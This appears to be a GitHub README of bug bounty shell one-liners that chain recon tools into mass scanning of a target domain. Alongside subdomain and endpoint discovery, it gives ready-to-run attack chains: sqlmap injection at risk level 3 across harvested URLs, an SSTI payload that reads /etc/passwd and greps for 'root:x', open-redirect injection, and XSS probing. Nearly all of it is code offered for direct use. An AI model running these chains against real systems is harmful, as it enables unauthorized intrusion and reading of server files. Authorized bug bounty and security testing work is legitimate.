# Oneliner-Cmd
 oneliner scripts for bug bounty

## List tools
- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Naabu](https://github.com/projectdiscovery/naabu)
- [httpx](https://github.com/projectdiscovery/httpx)
- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [Waybackurls](https://github.com/tomnomnom/waybackurls)
- [DNSProbe](https://github.com/projectdiscovery/dnsprobe)
- [gf](https://github.com/tomnomnom/gf)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [qsreplace](https://github.com/tomnomnom/qsreplace)
- [hakrawler](https://github.com/hakluke/hakrawler)
- [Puredns](https://github.com/d3mondev/puredns)
- [GauPlus](https://github.com/bp0lr/gauplus)
- [uro](https://github.com/s0md3v/uro)

### Auto scanner

```bash
subfinder -d site.com -all | naabu | httpx | nuclei -t nuclei-templates
```

### Finding files (For example in here .json file)

```bash
subfinder -d site.com -all | naabu | httpx | waybackurls | grep -E ".json(?:onp?)?$"
```

### Find interesting subdomain (For example like admin.staging.example.com) 

```bash
subfinder -d site.com -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'
```

### Find SQL injection at scale

```bash
subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
```

### Find open redirects at scale

```bash
subfinder -d site.com -all -silent | waybackurls | sort -u | gf redirect | qsreplace 'https://example.com' | httpx -fr -title --match-string 'Example Domain'
```

### Find SSTI at scale

```bash
echo "domain" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
```

### Scanning top exploited vulnerabilities according to CISA

```bash
subfinder -d site.com -all -silent | httpx -silent | nuclei -rl 50 -c 15 -timeout 10 -tags cisa -vv
```

### Bruteforce subdomains

```bash
subfinder -d site.com -all -silent | httpx -silent | hakrawler | tr "[:punct:]" "\n" | sort -u > wordlist.txt

puredns bruteforce wordlist.txt site.com -r resolvers.txt -w output.txt
```

### Finding Cross-Site Scripting (XSS) using KnoXSS API

```bash
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh
```

### Clean list of host, port, and version

```bash
mkdir nmap; cat targets.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../
```

### Waybackurls validator

```bash
waybackurls http://example.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} > %{url_effective}\n" | sort
```

### Extract endpoints from JS (Part 1)

```bash
curl -L -k -s https://www.example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
```

### Extract endpoints from JS (Part 2)

```bash
curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"#\" sh -c 'linkfinder.py -o cli -i #'"
```

### Extract endpoints from JS (Part 3)

```bash
curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
```

### Extract endpoints from JS (Part 4)

```bash
curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'##### %\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
```
